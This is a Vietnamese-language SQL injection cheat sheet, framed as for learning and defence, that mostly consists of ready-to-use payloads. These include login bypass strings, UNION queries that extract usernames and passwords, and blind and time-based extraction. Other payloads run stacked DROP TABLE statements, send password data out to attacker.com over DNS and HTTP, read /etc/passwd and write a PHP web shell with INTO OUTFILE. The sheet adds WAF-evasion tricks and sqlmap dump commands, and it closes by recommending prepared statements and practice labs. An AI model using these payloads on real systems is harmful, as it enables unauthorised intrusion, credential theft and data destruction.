Dưới đây là các kỹ thuật chèn (injection) SQL phổ biến, được phân loại theo mục đích và cách thức khai thác. **Tất cả chỉ nhằm mục đích học tập và phòng thủ – tuyệt đối không được dùng để tấn công hệ thống khi chưa có sự cho phép bằng văn bản.**

---
#sql
## 1. Kỹ thuật chèn cơ bản dựa trên kiểu dữ liệu

### a) String-based Injection
Áp dụng khi tham số là chuỗi được bao bởi dấu nháy đơn `'` hoặc nháy kép `"`.
```sql
-- Phá cấu trúc chuỗi:
' OR '1'='1
' OR 1=1 --
" OR "" = "
' UNION SELECT ...
```

### b) Numeric-based Injection
Khi tham số là số, không có dấu nháy.
```sql
-1 OR 1=1
1 AND 1=2
0 UNION SELECT ...
```

---

## 2. Vượt qua xác thực (Authentication Bypass)
Chèn vào form login để đăng nhập mà không cần mật khẩu thật.
```sql
-- Username / Password payload:
admin' --
admin' #
' OR '1'='1' --
' OR 1=1 --
') OR ('a'='a
```

---

## 3. Kỹ thuật Union Injection (In-band)
Dùng `UNION SELECT` để ghép thêm dữ liệu từ các bảng khác. Yêu cầu: số cột khớp với truy vấn gốc.

**Xác định số cột:**
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 -- (lỗi → có 2 cột)
```
Hoặc dùng `UNION SELECT NULL, NULL...` cho đến khi hết lỗi.

**Trích xuất dữ liệu:**
```sql
' UNION SELECT username, password FROM users --
' UNION SELECT null, table_name FROM information_schema.tables --
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT GROUP_CONCAT(username, 0x3a, password), null FROM users --
```

---

## 4. Error-based Injection (Lợi dụng thông báo lỗi)
Ép database trả về dữ liệu nhạy cảm trong thông báo lỗi. Phụ thuộc vào DBMS.

- **MySQL (dùng `extractvalue`, `updatexml`):**
```sql
' AND extractvalue(1, concat(0x7e, (SELECT password FROM users LIMIT 1))) --
' AND updatexml(1, concat(0x7e, (SELECT database())), 1) --
```

- **MSSQL (dùng `convert`, `cast`):**
```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
```

- **PostgreSQL:**
```sql
' AND 1=cast((SELECT version()) as int) --
```

---

## 5. Boolean-based Blind Injection
Dựa vào sự khác biệt của phản hồi (có nội dung / không có nội dung) để suy đoán từng bit dữ liệu.

```sql
-- Kiểm tra điều kiện đúng:
' AND 1=1 --  (trang bình thường)
' AND 1=2 --  (trang khác)

-- Đoán tên bảng:
' AND (SELECT table_name FROM information_schema.tables LIMIT 1) LIKE 'a%' --

-- Đoán mật khẩu ký tự từng ký tự:
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --
```

---

## 6. Time-based Blind Injection
Không cần thay đổi giao diện, ép server trì hoãn nếu điều kiện đúng.

- **MySQL:**
```sql
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0) --
' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --
```

- **PostgreSQL:**
```sql
' OR (SELECT CASE WHEN (length(current_database())=5) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

- **MSSQL:**
```sql
' IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>100) WAITFOR DELAY '0:0:5' --
```

---

## 7. Stacked Queries (Truy vấn chồng)
Một số database cho phép thực thi nhiều câu SQL liên tiếp, cách nhau bởi `;`. Nguy hiểm vì có thể INSERT, UPDATE, DELETE.

```sql
'; INSERT INTO users VALUES('hacker','pass123') --
'; DROP TABLE users --
'; SELECT * FROM users; --
```
Lưu ý: PHP + MySQL với `mysql_query()` không hỗ trợ, nhưng PHP + `mysqli_multi_query()` hay MSSQL thì có.

---

## 8. Second-Order SQL Injection
Dữ liệu độc hại được lưu vào DB (ví dụ khi tạo tài khoản) nhưng không gây hại ngay. Khi ứng dụng lấy ra và dùng trong câu query khác mà không xử lý an toàn, lỗi sẽ kích hoạt.
Ví dụ: lúc đăng ký username là `admin' --`, sau đó chức năng đổi mật khẩu chạy query:
```sql
UPDATE users SET password='newpass' WHERE username='admin' --'
```
Sẽ thành đổi mật khẩu của admin thật.

---

## 9. Out-of-band Injection
Dùng khi server không phản hồi trực tiếp, buộc nó gửi dữ liệu qua DNS hoặc HTTP.

- **MySQL (Windows – `LOAD_FILE`):**
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share')) --
```

- **MSSQL (dùng `xp_dirtree`, `xp_cmdshell`):**
```sql
'; exec master..xp_dirtree '//attacker.com/a' --
```

- **Oracle (dùng `UTL_HTTP`):**
```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users --
```

---

## 10. Đọc và ghi file (khi DB có quyền FILE)
- **MySQL đọc file:**
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), null --
```
- **MySQL ghi shell:**
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --
```

---

## 11. Kỹ thuật vượt tường lửa (WAF Bypass)
WAF thường chặn các từ khóa, dấu nháy... Một số cách phổ biến:

- **Comment xen kẽ:** `SEL/**/ECT`, `UN/**/ION`, `OR/**/1=1`
- **Thay đổi chữ hoa/thường:** `SeLeCt`, `UnIoN`
- **Sử dụng khoảng trắng thay thế:** tab, newline `%0a`, `%0d`, comment `/**/`
- **Mã hóa URL (URL Encoding):** `%27` thay cho `'`, `%20` thay cho dấu cách
- **Double URL Encoding:** `%2527` cho `'`
- **Dùng dấu ngoặc, không dùng khoảng trắng:** `OR(1=1)`
- **Toán tử logic thay thế:** `||` thay cho `OR`, `&&` thay cho `AND`
- **Tham số phân mảnh (parameter pollution):** gửi nhiều tham số cùng tên để đánh lừa logic lọc.
- **Sử dụng `CHAR()` thay vì chuỗi trực tiếp:** `CHAR(97,100,109,105,110)` tương đương `'admin'`

---

## 12. Công cụ hỗ trợ
- **sqlmap**: Tự động phát hiện và khai thác hầu hết các kỹ thuật trên. Câu lệnh cơ bản:
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump
```

---

Tất cả kiến thức trên nhằm giúp bạn hiểu tường tận cách kẻ tấn công suy nghĩ, từ đó xây dựng phòng thủ vững chắc. **Cách bảo vệ tối ưu nhất vẫn là dùng Prepared Statements (Parameterized Queries) với tham số ràng buộc và nguyên tắc đặc quyền tối thiểu cho database account.** Nếu muốn thực hành, hãy sử dụng môi trường lab như PortSwigger Web Security Academy, DVWA hay SQLi Labs.